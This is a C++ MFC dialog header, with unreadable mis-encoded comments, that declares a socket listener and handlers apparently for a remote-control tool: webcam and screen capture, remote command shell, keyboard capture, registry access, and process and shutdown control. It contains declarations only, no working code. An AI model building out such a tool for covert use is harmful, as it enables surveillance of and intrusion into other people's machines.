
// socket apcetDlg.h : ͷ�ļ�
//

#pragma once
#include "afxcmn.h"
#include "ListenSocket.h"
#include"resource.h"
#include "Ctip.h"
// CsocketapcetDlg �Ի���
class CsocketapcetDlg : public CDialogEx
{
// ����
public:
	CsocketapcetDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
	enum { IDD = IDD_SOCKETAPCET_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	
	CTreeCtrl m_tree;
	CListenSocket *m_pListensocket;
	void OnAccept();
	afx_msg void OnDblclkTree1(NMHDR *pNMHDR, LRESULT *pResult);
	 
	
	afx_msg void GetVdio();
	afx_msg void File();
	afx_msg void Getifo();
	afx_msg void screnn();
	afx_msg void cmd();
	afx_msg void keyboard();
	afx_msg void shutdown();
	afx_msg void reboot();
	afx_msg void exit();
	afx_msg void mess();
	afx_msg void clean();
	afx_msg void process();
	afx_msg void server();
	afx_msg void reg();
};
